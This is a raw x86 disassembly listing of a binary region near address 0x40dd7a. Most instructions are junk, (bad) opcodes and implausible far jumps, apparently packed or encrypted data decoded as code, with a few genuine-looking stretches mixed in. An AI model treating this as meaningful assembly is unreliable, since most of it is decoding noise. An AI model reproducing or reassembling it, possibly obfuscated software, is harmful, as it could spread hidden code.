  40dd7a:	idiv   BYTE PTR [edx+0x6e12e81]
  40dd80:	or     BYTE PTR [ecx-0x32fdbd80],0x47
  40dd87:	jmp    0xfc27:0xec8af185
  40dd8e:	add    ecx,DWORD PTR [esi+0x62d6bef5]
  40dd94:	daa    
  40dd95:	jb     0x40dd37
  40dd97:	sub    esp,ecx
  40dd99:	cs push ss
  40dd9b:	int3   
  40dd9c:	mov    ds:0xeb016454,eax
  40dda1:	xor    esp,DWORD PTR [edx-0x53506ca]
  40dda7:	dec    edi
  40dda8:	loope  0x40ddb6
  40ddaa:	xor    ch,BYTE PTR [eax+0x40]
  40ddad:	nop
  40ddae:	push   edx
  40ddaf:	mov    bh,0x2d
  40ddb1:	inc    ecx
  40ddb2:	push   ecx
  40ddb3:	int    0xb4
  40ddb5:	cmc    
  40ddb6:	ds retf 
  40ddb8:	imul   edi,DWORD PTR [esi-0x4cf6e045],0xffffffc1
  40ddbf:	jg     0x40ddd2
  40ddc1:	xchg   DWORD PTR [ecx+0x3173d2d8],esi
  40ddc7:	cmp    eax,0xb1cf571b
  40ddcc:	mov    ds:0xe53cbd09,eax
  40ddd1:	fs loop 0x40ddac
  40ddd4:	(bad)  
  40ddd5:	out    0x1c,al
  40ddd7:	cdq    
  40ddd8:	cmp    al,ah
  40ddda:	int3   
  40dddb:	retf   0x8742
  40ddde:	push   ebp
  40dddf:	mov    DWORD PTR [eax],eax
  40dde1:	mov    edx,0xc1e55424
  40dde7:	jmp    0x40dd7d
  40dde9:	mov    ebx,0x903d0f60
  40ddee:	shl    dh,cl
  40ddf0:	ficomp WORD PTR [esi+0x43]
  40ddf3:	xor    edx,0x54262acc
  40ddf9:	adc    eax,0x775d6ee4
  40ddfe:	inc    edx
  40ddff:	adc    edx,DWORD PTR [edx+0x67]
  40de02:	into   
  40de03:	or     eax,0xf6fb6a7a
  40de08:	mov    dl,BYTE PTR [ebx]
  40de0a:	daa    
  40de0b:	jmp    FWORD PTR [eax+0x24]
  40de0e:	mov    DWORD PTR [edi],esi
  40de10:	jle    0x40de30
  40de12:	jo     0x40de6e
  40de14:	ret    0x102
  40de17:	lods   al,BYTE PTR ds:[esi]
  40de18:	mov    ebx,0xbccbf24
  40de1d:	popa   
  40de1e:	jbe    0x40de89
  40de20:	popf   
  40de21:	ret    0xa140
  40de24:	sub    ecx,DWORD PTR [esi]
  40de26:	pop    es
  40de27:	lea    ebx,[esi]
  40de29:	jae    0x40de6a
  40de2b:	inc    edx
  40de2c:	xchg   ebx,eax
  40de2d:	mov    edx,0x5972c734
  40de32:	sbb    ecx,ebx
  40de34:	cld    
  40de35:	bound  esp,QWORD PTR [ecx+0x8a720ac]
  40de3b:	scas   eax,DWORD PTR es:[edi]
  40de3c:	add    esp,DWORD PTR [esi-0x69]
  40de3f:	lds    esp,FWORD PTR [eax]
  40de41:	repz jg 0x40de0a
  40de44:	jb     0x40de1b
  40de46:	push   ds
  40de47:	cmp    eax,0x362a6a09
  40de4c:	xor    bh,BYTE PTR ss:[edi-0x7c2a7210]
  40de53:	frstor [ecx]
  40de55:	mov    ch,0xeb
  40de57:	mov    esi,0xf2542eae
  40de5c:	dec    edi
  40de5d:	cld    
  40de5e:	mov    ds:0x4504b2f5,al
  40de63:	cmc    
  40de64:	rcr    BYTE PTR [ebx],cl
  40de66:	adc    bh,cl
  40de68:	mov    dh,0xac
  40de6a:	dec    edi
  40de6b:	xlat   BYTE PTR ds:[ebx]
  40de6c:	lea    eax,ss:[ecx*8-0x7f49cd1]
  40de74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de75:	add    DWORD PTR [ebx-0x5f829a22],esi
  40de7b:	inc    edx
  40de7c:	push   0xb
  40de7e:	mov    ebx,0x6f425525
  40de83:	lods   al,BYTE PTR ds:[esi]
  40de84:	cmp    al,BYTE PTR gs:[ebp+ebp*1+0xe2c1b47]
  40de8c:	aad    0xe
  40de8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de8f:	jno    0x40de28
  40de91:	mov    eax,0xc80ae43f
  40de96:	sbb    al,0xb9
  40de98:	inc    edi
  40de99:	(bad)  
  40de9a:	fnstsw WORD PTR [eax-0x17]
  40de9d:	adc    al,0xa6
  40de9f:	fwait
  40dea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dea1:	push   ebx
  40dea2:	int3   
  40dea3:	sub    al,0xd3
  40dea5:	push   ebp
  40dea6:	dec    edi
  40dea7:	mov    bl,BYTE PTR [ecx+0x6]
  40deaa:	xor    BYTE PTR [edi+edi*4+0x15],al
  40deae:	idiv   DWORD PTR [eax]
  40deb0:	mov    al,ds:0x3c4ed16c
  40deb5:	out    dx,al
  40deb6:	sbb    al,0x80
  40deb8:	jne    0x40df35
  40deba:	sbb    DWORD PTR [eax],0xffffffc0
  40debd:	adc    DWORD PTR [esi-0x17891a9c],0x1d03095b
  40dec7:	dec    ecx
  40dec8:	pop    esp
  40dec9:	cdq    
  40deca:	cmp    DWORD PTR [edi-0x27],edx
  40decd:	jnp    0x40dedc
  40decf:	test   DWORD PTR [ecx+0x6c],ecx
  40ded2:	loope  0x40de99
  40ded4:	ret    0x1fe2
  40ded7:	jge    0x40df17
  40ded9:	push   esp
  40deda:	test   BYTE PTR [ebp+0x50],ch
  40dedd:	popf   
  40dede:	or     eax,0xc61ac360
  40dee3:	mov    edi,0xa5005159
  40dee8:	mov    bh,BYTE PTR [ebp-0x3a09fb2f]
  40deee:	out    dx,al
  40deef:	add    BYTE PTR [ecx*1+0x8edd187],al
  40def6:	xor    eax,DWORD PTR [eax]
  40def8:	fwait
  40def9:	cmp    eax,DWORD PTR [ebp+0x72]
  40defc:	lea    esi,ds:0x6f48d7bd
  40df02:	out    0x25,eax
  40df04:	aam    0x66
  40df06:	and    dh,BYTE PTR [ebx+ecx*4+0x53]
  40df0a:	stos   BYTE PTR es:[edi],al
  40df0b:	fistp  DWORD PTR [ecx-0x66]
  40df0e:	inc    ecx
  40df0f:	rcr    BYTE PTR [ecx-0x7fcef527],0xff
  40df16:	sub    DWORD PTR [edi+ecx*4],eax
  40df19:	rcr    BYTE PTR [edx-0x5feee6b4],cl
  40df1f:	(bad)  
  40df20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df21:	repnz pop ecx
  40df23:	or     eax,0x30d77acc
  40df28:	pop    es
  40df29:	fwait
  40df2a:	cmp    ebp,esi
  40df2c:	xchg   BYTE PTR [ecx],ch
  40df2e:	aad    0x1e
  40df30:	(bad)  
  40df31:	push   edx
  40df32:	inc    edi
  40df33:	enter  0x3515,0xc1
  40df37:	adc    al,0xc
  40df39:	(bad)  
  40df3a:	dec    DWORD PTR [ecx+0x434836e9]
  40df40:	rol    BYTE PTR [ecx+0x3dc1b689],1
  40df46:	call   0x86d6:0x36c03387
  40df4d:	mov    dh,0x73
  40df4f:	pop    eax
  40df50:	mov    DWORD PTR ds:[ebx-0x7d94f3a2],0x1f3ee0aa
  40df5b:	push   ecx
  40df5c:	(bad)  
  40df5d:	(bad)  
  40df5e:	jg     0x40deec
  40df60:	and    BYTE PTR [ebp+0x2e82a0d],0x83
  40df67:	es inc ebx
  40df69:	frstor [edx]
  40df6b:	loop   0x40defd
  40df6d:	push   esi
  40df6e:	jmp    0x40defb
  40df70:	inc    esp
  40df71:	or     ch,BYTE PTR [ecx-0x74]
  40df74:	(bad)  
  40df76:	inc    ebx
  40df77:	ja     0x40df02
  40df79:	jl     0x40df74
  40df7b:	mov    dl,0x18
  40df7d:	pop    es
  40df7e:	jle    0x40df94
  40df80:	sbb    bh,BYTE PTR ds:0xb830552
  40df86:	retf   
  40df87:	rol    DWORD PTR [edi],cl
  40df89:	imul   esp,esi,0xfffffff7
  40df8c:	xchg   edi,eax
  40df8d:	and    al,0x94
  40df8f:	scas   eax,DWORD PTR es:[edi]
  40df90:	add    eax,0xc5e9c944
  40df95:	ins    DWORD PTR es:[edi],dx
  40df96:	xchg   BYTE PTR [edx-0x4f9b9328],bl
  40df9c:	stos   DWORD PTR es:[edi],eax
  40df9d:	fwait
  40df9e:	inc    esi
  40df9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfa0:	push   ebp
  40dfa1:	xor    BYTE PTR [ebp+eiz*1+0x7],ch
  40dfa5:	lock push ebp
  40dfa7:	add    eax,0x93e3b1a7
  40dfac:	mov    edx,ecx
  40dfae:	addr16 mov ds:0xc9e,al
  40dfb2:	scas   al,BYTE PTR es:[edi]
  40dfb3:	test   cl,dh
  40dfb5:	(bad)  
  40dfb6:	in     al,dx
  40dfb7:	cmp    eax,esp
  40dfb9:	shr    ah,0xe2
  40dfbc:	cmp    al,0xbe
  40dfbe:	push   0xe663600c
  40dfc3:	push   cs
  40dfc4:	imul   edi,DWORD PTR [ebx],0x69
  40dfc7:	cmp    dh,BYTE PTR [eax]
  40dfc9:	and    cl,BYTE PTR [eax]
  40dfcb:	add    al,0x66
  40dfcd:	xor    edi,DWORD PTR [ecx+0x3d]
  40dfd0:	pop    ecx
  40dfd1:	sti    
  40dfd2:	mov    bh,0xef
  40dfd4:	jae    0x40df90
  40dfd6:	inc    ebp
  40dfd7:	mov    DWORD PTR [edx],ecx
  40dfd9:	pop    ebx
  40dfda:	cmp    DWORD PTR [ebx],esp
  40dfdc:	inc    edx
  40dfdd:	out    0x85,al
  40dfdf:	addr16 cwde 
  40dfe1:	popa   
  40dfe2:	mov    ebx,0x46450dfe
  40dfe7:	data16 add BYTE PTR [edx-0x12b8e2],bl
  40dfee:	in     al,0x7e
  40dff0:	stc    
  40dff1:	outs   dx,BYTE PTR ds:[esi]
  40dff2:	int    0xa3
  40dff4:	xor    ch,bl
  40dff6:	les    edi,FWORD PTR [esi+0x75b6a882]
  40dffc:	mov    ecx,DWORD PTR [esi-0x68177375]
  40e002:	popf   
  40e003:	imul   ecx,DWORD PTR [esi-0x48d38ed9],0xffffffc1
  40e00a:	and    al,0x45
  40e00c:	push   ebp
  40e00d:	fwait
  40e00e:	mov    ecx,0x5a3fb394
  40e013:	push   ecx
  40e014:	fs mov bh,0x52
  40e017:	push   eax
  40e018:	pusha  
  40e019:	mov    ebx,0xd31d15df
  40e01e:	sub    ebx,esi
  40e020:	jge    0x40dfc5
  40e022:	inc    ebp
  40e023:	mov    al,ds:0xfec7c117
  40e028:	dec    esp
  40e029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e02a:	dec    ebp
  40e02b:	or     bh,BYTE PTR [edx+0x602bde8f]
  40e031:	inc    esp
  40e032:	adc    BYTE PTR [eax],dl
  40e034:	scas   al,BYTE PTR es:[edi]
  40e035:	dec    ebp
  40e036:	pop    esi
  40e037:	or     esi,edi
  40e039:	arpl   WORD PTR [edx-0x2804b285],cx
  40e03f:	mov    eax,0xf96a8468
  40e044:	jno    0x40dfd1
  40e046:	dec    esp
  40e047:	(bad)  
  40e048:	or     eax,0x33cfd7b9
  40e04d:	(bad)  
  40e04e:	aas    
  40e04f:	xor    edi,edi
  40e051:	add    ecx,ebx
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434396
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0x95b3baa7
  40e071:	xchg   esi,eax
  40e072:	loop   0x40e06d
  40e074:	xchg   edx,eax
  40e075:	jo     0x40e0e7
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e0cf
  40e07c:	push   eax
  40e07d:	mov    ecx,0x3a83a13b
  40e082:	fild   QWORD PTR [eax+0x2dfc8a9d]
  40e088:	add    eax,0x730548bf
  40e08d:	outs   dx,BYTE PTR ds:[esi]
  40e08f:	push   ebp
  40e090:	push   ss
  40e091:	ds sahf 
  40e093:	outs   dx,DWORD PTR ds:[esi]
  40e094:	jmp    0x7609585
  40e099:	lock mov ebx,0x288c42ce
  40e09f:	mov    WORD PTR [ebp-0x71c3737],?
  40e0a5:	push   ds
  40e0a6:	ror    BYTE PTR [edx+0x23180c68],0xc
  40e0ad:	(bad)  [ecx+0x36909bd0]
  40e0b3:	cmp    DWORD PTR [eax+0x73d43e91],esi
  40e0b9:	sbb    al,0xc3
  40e0bb:	retf   
  40e0bc:	fstp   TBYTE PTR [ecx-0x4bba5fa5]
  40e0c2:	pop    ecx
  40e0c3:	mov    eax,0xd3aa1c68
  40e0c8:	xor    ecx,ecx
  40e0ca:	jecxz  0x40e13c
  40e0cc:	test   ebp,ecx
  40e0ce:	popa   
  40e0cf:	sbb    al,0x93
  40e0d1:	sar    DWORD PTR [ecx-0x6d],1
  40e0d4:	push   esi
  40e0d5:	enter  0x45e5,0x3a
  40e0d9:	mov    DWORD PTR [edx],0x4bca6a31
  40e0df:	xor    dh,BYTE PTR [ecx+0x5b57ba5d]
  40e0e5:	mov    edx,ebp
  40e0e7:	lahf   
  40e0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0e9:	scas   al,BYTE PTR es:[edi]
  40e0ea:	sub    al,0x8e
  40e0ec:	add    BYTE PTR [ecx+0x3acc6d23],bh
  40e0f2:	js     0x40e09b
  40e0f4:	mov    edi,0x3a51e7a6
  40e0f9:	pop    esi
  40e0fa:	test   eax,0xb4dae98e
  40e0ff:	lds    edi,FWORD PTR [ecx]
  40e101:	leave  
  40e102:	jge    0x40e12c
  40e104:	cld    
  40e105:	jo     0x40e179
  40e107:	je     0x40e0f8
  40e109:	sub    DWORD PTR [ebp-0x59],esp
  40e10c:	aad    0x20
  40e10e:	adc    bh,al
  40e110:	mov    WORD PTR [ebp-0x3c856ac3],gs
  40e116:	adc    dh,BYTE PTR [ebx]
  40e118:	xchg   ecx,eax
  40e119:	jae    0x40e150
  40e11b:	sar    DWORD PTR [esi+0xc1e1d4],0x67
  40e122:	fnsave [ebp-0x365cee8c]
  40e128:	scas   al,BYTE PTR es:[edi]
  40e129:	aam    0xc8
  40e12b:	in     al,0x3d
  40e12d:	or     bh,0xa5
  40e130:	pop    ebp
  40e131:	inc    eax
  40e132:	pop    eax
  40e133:	sub    dh,bh
  40e135:	ret    
  40e136:	cdq    
  40e137:	dec    eax
  40e138:	dec    esp
  40e139:	jecxz  0x40e1af
  40e13b:	or     DWORD PTR ss:[ebp+esi*1+0x56],ebp
  40e140:	cdq    
  40e141:	pop    ss
  40e142:	lods   al,BYTE PTR ds:[esi]
  40e143:	add    esi,edx
  40e145:	jl     0x40e110
  40e147:	mov    cl,0x30
  40e149:	sub    ah,ch
  40e14b:	cmp    ecx,0x4c
  40e14e:	pusha  
  40e14f:	sub    DWORD PTR [ebp+0x5483ee69],esp
  40e155:	dec    esp
  40e156:	push   ss
  40e157:	pop    ss
  40e158:	push   edx
  40e159:	xchg   ebx,eax
  40e15a:	sbb    DWORD PTR [ecx+0x52873609],edi
  40e160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e161:	retf   0x50ae
  40e164:	xchg   ebp,eax
  40e165:	daa    
  40e166:	dec    esp
  40e167:	out    0xb2,al
  40e169:	dec    ebx
  40e16a:	push   edi
  40e16b:	or     bl,BYTE PTR [eax-0x22]
  40e16e:	retf   
  40e16f:	adc    al,0xa1
  40e171:	mov    bh,0xcd
  40e173:	and    al,0x86
  40e175:	inc    edx
  40e176:	adc    dh,al
  40e178:	or     al,0x30
  40e17a:	sub    BYTE PTR [eax+0x1817c550],0x61
  40e181:	inc    eax
  40e182:	mov    bl,BYTE PTR [ebp+edi*8-0x13]
  40e186:	sub    al,0x6
  40e188:	fild   WORD PTR [edx+0x23625c5a]
  40e18e:	(bad)  
  40e18f:	mov    edi,0x6e8df615
  40e194:	ret    0x59ab
  40e197:	add    BYTE PTR [edi+0x54189285],0xe2
  40e19e:	xchg   BYTE PTR [ebx],bl
  40e1a0:	out    dx,eax
  40e1a1:	xor    eax,0x84f7c363
  40e1a6:	xchg   ecx,eax
  40e1a7:	add    ebp,DWORD PTR [edi-0x69fd1541]
  40e1ad:	imul   esp,esi,0xffffffb3
  40e1b0:	or     al,0xdf
  40e1b2:	xor    BYTE PTR [edx+eiz*8-0x30],bl
  40e1b6:	lds    ebp,FWORD PTR [edx+0x2dae0cb7]
  40e1bc:	dec    edx
  40e1bd:	xor    edi,DWORD PTR [ebp+0x32252b05]
  40e1c3:	iret   
  40e1c4:	cmp    DWORD PTR [esp+ecx*1+0x7a765041],edx
  40e1cb:	dec    edx
  40e1cc:	cmp    eax,0x4b0fdfb0
  40e1d1:	int3   
  40e1d2:	mov    al,0x12
  40e1d4:	push   es
  40e1d5:	call   0x4748:0x1133bb09
  40e1dc:	clc    
  40e1dd:	dec    ebx
  40e1de:	sub    DWORD PTR [edi+0x31],0x8e5bc55f
  40e1e5:	mov    dh,0x4f
  40e1e7:	jp     0x40e1b0
  40e1e9:	(bad)  
  40e1eb:	inc    ecx
  40e1ec:	sbb    ch,BYTE PTR [ecx]
  40e1ee:	in     eax,0x80
  40e1f0:	jp     0x40e20f
  40e1f2:	mov    dl,0x1e
  40e1f4:	pushf  
  40e1f5:	jo     0x40e1ec
  40e1f7:	xchg   ecx,eax
  40e1f8:	(bad)  
  40e1f9:	mov    al,ds:0xbe999820
  40e1fe:	je     0x40e274
  40e200:	out    0x40,eax
  40e202:	cmp    BYTE PTR [esi+0x2b],bl
  40e205:	int    0x44
  40e207:	pop    edx
  40e208:	jae    0x40e20e
  40e20a:	loope  0x40e1a4
  40e20c:	or     eax,0x305ec3cd
  40e211:	adc    al,0x35
  40e213:	dec    ecx
  40e214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e215:	lock inc ecx
  40e217:	mov    ebx,0xe53d01ae
  40e21c:	arpl   WORD PTR [eax+0x43],bx
  40e21f:	xor    DWORD PTR [ebp-0x3cbec571],esi
  40e225:	mov    bl,0x1e
  40e227:	sbb    cl,dl
  40e229:	fimul  DWORD PTR [edi-0x2b8c490b]
  40e22f:	mov    esp,0xcfbe1708
  40e234:	call   0xed451ff3
  40e239:	sub    BYTE PTR [eax],bh
  40e23b:	inc    ebx
  40e23c:	dec    eax
  40e23d:	data16 adc cl,BYTE PTR [esi+esi*8]
  40e241:	xchg   edi,eax
  40e242:	pop    ecx
  40e243:	fldenv [ebp+ecx*8+0x4]
  40e247:	ins    DWORD PTR es:[edi],dx
  40e248:	inc    eax
  40e249:	ja     0x40e211
  40e24b:	jne    0x40e22f
  40e24d:	add    bl,BYTE PTR [ebx]
  40e24f:	dec    esp
  40e250:	add    DWORD PTR [edx-0x1732706d],ebx
  40e256:	add    ebp,DWORD PTR [esp+ebx*2+0xc]
  40e25a:	bound  eax,QWORD PTR [eax+0x6b]
  40e25d:	stc    
  40e25e:	pop    esp
  40e25f:	getsec 
  40e261:	push   ebx
  40e262:	mov    al,0x7a
  40e264:	adc    ah,dl
  40e266:	call   0x70b0:0x788d21ce
  40e26d:	adc    DWORD PTR [esi],esp
  40e26f:	xchg   esi,eax
  40e270:	and    edx,DWORD PTR [edi]
  40e272:	push   ds
  40e273:	test   ecx,ebp
  40e275:	fs ja  0x40e24c
  40e278:	push   ss
  40e279:	mov    ch,0x1a
  40e27b:	pop    esi
  40e27c:	mov    ds:0x776868ff,eax
  40e281:	inc    ecx
  40e282:	into   
  40e283:	(bad)  
  40e284:	mov    dl,0x67
  40e286:	test   ebx,edx
  40e288:	mov    ?,esp
  40e28a:	jl     0x40e2e6
  40e28c:	loop   0x40e2f6
  40e28e:	iret   
  40e28f:	enter  0xdb7c,0xfc
  40e293:	sbb    dl,ch
  40e295:	cmp    BYTE PTR [eax-0x47],ah
  40e298:	call   0x3fd4f761
  40e29d:	inc    edx
  40e29e:	iret   
  40e29f:	cmc    
  40e2a0:	out    dx,al
  40e2a1:	dec    esi
  40e2a2:	xchg   BYTE PTR [ecx+ecx*4],bl
  40e2a5:	std    
  40e2a6:	mov    esp,0x77410a93
  40e2ab:	stc    
  40e2ac:	xlat   BYTE PTR ds:[ebx]
  40e2ad:	fdiv   DWORD PTR [edx+0xa0446cd]
  40e2b4:	mov    eax,0x85356af0
  40e2b9:	(bad)  
  40e2bb:	push   0xffffffb5
  40e2bd:	aad    0x54
  40e2bf:	jmp    0x40e300
  40e2c1:	retf   0xcc9a
  40e2c4:	xor    edx,edi
  40e2c6:	and    edi,DWORD PTR [ecx-0x7cac1685]
  40e2cc:	or     BYTE PTR [eax+0x66e5e471],dh
  40e2d2:	ss push ds
  40e2d4:	jmp    0xc0aaa22
  40e2d9:	xor    eax,0x96c142bb
  40e2de:	mov    edx,0xee36f5da
  40e2e3:	das    
  40e2e4:	sbb    al,dl
  40e2e6:	mul    DWORD PTR [edx+0x319a904d]
  40e2ec:	or     esp,DWORD PTR [ecx+0x7cb568e7]
  40e2f2:	ret    
  40e2f3:	xor    BYTE PTR [ebp+0x29],bh
  40e2f6:	push   ds
  40e2f7:	pop    eax
  40e2f8:	aas    
  40e2f9:	fwait
  40e2fa:	dec    ebp
  40e2fb:	cmp    esp,DWORD PTR [ebp-0x2ef3063b]
  40e301:	or     eax,0xa91b7718
  40e306:	imul   esp,DWORD PTR [ebx-0x43],0x2d
  40e30a:	sbb    edi,DWORD PTR [edx+0x2]
  40e30d:	and    dh,BYTE PTR [edx]
  40e30f:	lahf   
  40e310:	out    dx,al
  40e311:	jno    0x40e32d
  40e313:	fsubr  st,st(7)
  40e315:	dec    ecx
  40e316:	cmp    BYTE PTR [ebx],bl
  40e318:	out    0xfe,al
  40e31a:	push   ecx
  40e31b:	mov    BYTE PTR [esi+0x5c],al
  40e31e:	jp     0x40e2c6
  40e320:	ret    
  40e321:	rcr    DWORD PTR [ecx+ebx*2+0x67],0x7c
  40e326:	pop    ebx
  40e327:	outs   dx,DWORD PTR ds:[esi]
  40e328:	in     eax,0x63
  40e32a:	jmp    0x40e2ea
  40e32c:	push   ds
  40e32d:	nop
  40e32e:	scas   al,BYTE PTR es:[edi]
  40e32f:	and    bl,BYTE PTR [esi-0x1046a115]
  40e335:	je     0x40e376
  40e337:	xchg   BYTE PTR [edx-0x14b25198],ah
  40e33d:	mov    ecx,0xfe794c8f
  40e342:	jno    0x40e358
  40e344:	push   edx
  40e345:	mov    eax,ds:0xc7dc44bf
  40e34a:	pop    edi
  40e34b:	iret   
  40e34c:	mov    esi,0xd2187a3f
  40e351:	pop    ebp
  40e352:	stos   DWORD PTR es:[edi],eax
  40e353:	adc    ch,BYTE PTR [ebx]
  40e355:	lods   eax,DWORD PTR ds:[esi]
  40e356:	lods   eax,DWORD PTR ds:[esi]
  40e357:	adc    ch,bl
  40e359:	cmp    al,0xeb
  40e35b:	xchg   ebp,eax
  40e35c:	imul   ebx,DWORD PTR [ebp-0x5ffdcc38],0x1b9add11
  40e366:	pop    ebx
  40e367:	push   edi
  40e368:	ret    0x9de6
  40e36b:	jb     0x40e33e
  40e36d:	mov    WORD PTR [ebx+edi*4+0x1dc37f00],cs
  40e374:	cmp    al,0xa5
  40e376:	mov    DWORD PTR ds:0x37f87d07,eax
  40e37c:	(bad)  
  40e37d:	jecxz  0x40e339
  40e37f:	test   DWORD PTR [esi+0x28ac8a4c],ebp
  40e385:	bound  edi,QWORD PTR [eax-0x32199324]
  40e38b:	sbb    al,ah
  40e38d:	js     0x40e357
  40e38f:	push   0xffffff85
  40e391:	sahf   
  40e392:	in     al,0xe1
  40e394:	mov    al,0x6f
  40e396:	sar    DWORD PTR [ebp+0x3983d671],1
  40e39c:	cli    
  40e39d:	mov    eax,0x39f4720
  40e3a2:	push   edi
  40e3a3:	ins    DWORD PTR es:[edi],dx
  40e3a4:	xchg   DWORD PTR [esi],edx
  40e3a6:	push   ds
  40e3a7:	stos   BYTE PTR es:[edi],al
  40e3a8:	dec    esp
  40e3a9:	mov    ebx,0xe2874042
  40e3ae:	jl     0x40e33f
  40e3b0:	pop    esi
  40e3b1:	jle    0x40e3cb
  40e3b3:	cmp    edi,esp
  40e3b5:	inc    eax
  40e3b6:	std    
  40e3b7:	bound  ebp,QWORD PTR [ecx+0x1d577dea]
  40e3bd:	sbb    al,0xd0
  40e3bf:	mov    edi,0xa30e0a67
  40e3c4:	lds    edi,FWORD PTR [ebp-0x31458039]
  40e3ca:	scas   eax,DWORD PTR es:[edi]
  40e3cb:	and    ebp,DWORD PTR [esp+eiz*2+0x367e9820]
  40e3d2:	push   esp
  40e3d3:	xor    BYTE PTR [ebx-0x256a96a6],bl
  40e3d9:	outs   dx,DWORD PTR ds:[esi]
  40e3da:	lods   eax,DWORD PTR cs:[esi]
  40e3dc:	(bad)  
  40e3dd:	cld    
  40e3de:	clc    
  40e3df:	sbb    cl,BYTE PTR [edi-0x1c0b9519]
  40e3e5:	fisttp DWORD PTR ds:0xa82fc6b1
  40e3eb:	add    BYTE PTR [edx+0x0],0x43
  40e3ef:	dec    eax
  40e3f0:	mov    bl,0x5a
  40e3f2:	xchg   esi,eax
  40e3f3:	push   edi
  40e3f4:	outs   dx,DWORD PTR ds:[esi]
  40e3f5:	(bad)  
  40e3f6:	mov    esi,0xd3f51694
  40e3fb:	inc    eax
  40e3fc:	ret    
  40e3fd:	ror    edi,cl
  40e3ff:	xchg   BYTE PTR [ecx+0xd],bl
  40e402:	add    ah,bl
  40e404:	mov    ch,0xda
  40e406:	pop    ebx
  40e407:	dec    eax
  40e408:	or     DWORD PTR [edx],esp
  40e40a:	(bad)  
  40e40b:	and    al,0x7a
  40e40d:	ins    DWORD PTR es:[edi],dx
  40e40e:	sbb    DWORD PTR [ebx+0x79],esp
  40e411:	jg     0x40e3d6
  40e413:	xor    DWORD PTR [edx+edx*8],edx
  40e416:	pop    es
  40e417:	pop    esp
  40e418:	xlat   BYTE PTR ds:[ebx]
  40e419:	sub    ch,BYTE PTR [ebp+0x5b]
  40e41c:	jl     0x40e3fa
  40e41e:	imul   ecx,DWORD PTR [ecx-0x16],0x40fddf66
  40e425:	sbb    eax,0x12c6fccd
  40e42a:	add    eax,0xe234771f
  40e42f:	adc    eax,0xa3180f93
  40e434:	pop    ebx
  40e435:	fwait
  40e436:	nop
  40e437:	xchg   DWORD PTR [ebx+ebp*2-0x5f],ebp
  40e43b:	outs   dx,BYTE PTR ds:[esi]
  40e43c:	dec    edx
  40e43d:	addr16 mov ds:0x6785,al
  40e441:	or     eax,0xee576940
  40e446:	in     eax,0x7d
  40e448:	sbb    bh,al
  40e44a:	pusha  
  40e44b:	int3   
  40e44c:	iret   
  40e44d:	out    dx,eax
  40e44e:	aad    0x4a
  40e450:	mov    ds:0xfe840f9e,al
  40e455:	sbb    BYTE PTR [eax],al
  40e457:	add    BYTE PTR [edi],cl
  40e459:	mov    dh,0x5
  40e45b:	add    BYTE PTR [ebx+0x43],0x0
  40e45f:	add    DWORD PTR ds:0x43441d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432dda,0x4326f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432dc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434392,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	shl    DWORD PTR ds:0x9ed240bb,cl
  40e4bf:	jo     0x40e531
  40e4c1:	dec    ecx
  40e4c2:	jge    0x40e534
  40e4c4:	jo     0x40e4e8
  40e4c6:	mov    es,WORD PTR [ebx-0x36f483b7]
  40e4cc:	sbb    edx,DWORD PTR [ecx+0x6e374cd2]
  40e4d2:	mov    ebp,0xc354c32b
  40e4d7:	jnp    0x40e526
  40e4d9:	fst    QWORD PTR [ebp+0x72]
  40e4dc:	(bad)  
  40e4de:	add    eax,0xfbca443e
  40e4e3:	push   0x16
  40e4e5:	adc    al,0xd5
  40e4e7:	les    esp,FWORD PTR [edx-0x42]
  40e4ea:	in     eax,dx
  40e4eb:	xor    eax,0x15e081cf
  40e4f0:	les    esp,FWORD PTR [esi]
  40e4f2:	add    edx,ecx
  40e4f4:	mov    al,ds:0x98ba6564
  40e4f9:	and    ebx,DWORD PTR ds:0x2523bae
  40e4ff:	enter  0x1060,0xd9
  40e503:	inc    esi
  40e504:	cli    
  40e505:	push   esp
  40e506:	aaa    
  40e507:	pushf  
  40e508:	dec    DWORD PTR [ebx]
  40e50a:	ds xor eax,0xe0b69592
  40e510:	adc    bh,dh
  40e512:	inc    edx
  40e513:	sub    eax,0x740f7f86
  40e518:	mov    esp,0xad8283e
  40e51d:	and    edx,DWORD PTR [edi+0x2ba27eff]
  40e523:	imul   edi,DWORD PTR [esi+ebp*4-0x74],0x58
  40e528:	(bad)  
  40e529:	icebp  
  40e52a:	xchg   edi,eax
  40e52b:	cli    
  40e52c:	daa    
  40e52d:	pushfw 
  40e52f:	add    DWORD PTR [edx-0x2eebbb5e],eax
  40e535:	or     al,0x2a
  40e537:	sub    DWORD PTR [ebx-0x2900c06f],ecx
  40e53d:	sahf   
  40e53e:	fs inc ebx
  40e540:	jmp    0x40e572
  40e542:	push   eax
